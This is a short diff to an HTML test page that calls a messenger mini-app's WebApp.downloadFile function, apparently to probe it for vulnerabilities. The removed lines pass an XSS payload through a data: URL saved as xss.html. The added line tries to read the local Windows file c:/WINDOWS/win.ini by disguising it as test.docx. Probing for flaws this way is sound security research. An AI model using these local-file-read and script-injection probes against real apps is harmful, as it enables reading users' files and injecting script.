@@ -1,8 +1,5 @@
 <script src="https://st.max.ru/js/max-web-app.js"></script>
 <script>
-    WebApp.downloadFile("https://fd.oneme.ru/getfile?sig=6joZJpReevVEsGWMB656wIhnR_FY9pGilmx1qWs0hbyiDzlgdZxa2ZZSinxo6iz-a824xmD0WAaiDPuyMjmcLg&expires=1750323246048&clientType=6&id=572739&userId=288783","test.docx");
-    setTimeout(() => {
-        if (typeof WebApp !== "undefined" && WebApp.downloadFile) {
-            WebApp.downloadFile("data:text/html,<img scr=x onerror=alert(1)>","xss.html");}}, 1000);
+    WebApp.downloadFile("file:///c:/WINDOWS/win.ini","test.docx");
 </script>
 </script>
